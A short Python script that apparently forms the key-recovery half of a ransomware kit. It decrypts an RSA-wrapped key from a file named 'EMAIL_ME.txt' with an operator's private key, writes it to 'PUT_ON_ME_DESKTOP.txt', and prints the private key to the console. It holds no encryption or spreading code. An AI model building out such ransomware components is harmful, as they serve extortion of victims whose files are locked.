from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

with open('EMAIL_ME.txt', 'rb') as file:
    fernet_key = file.read()
    print(fernet_key)

private_key = RSA.import_key(open('private.pem').read())

private_crypter = PKCS1_OAEP.new(private_key)

decrypt_fernet_key = private_crypter.decrypt(fernet_key)

with open('PUT_ON_ME_DESKTOP.txt', 'wb') as file:
    file.write(decrypt_fernet_key)


print('[>] Private Key: {}'.format(private_key))
print('[>] Private Decrypter: {}'.format(private_crypter))
print('[>] Decrypted fernet Key: {}'.format(decrypt_fernet_key))
print('[>] Decrpytion Completed')

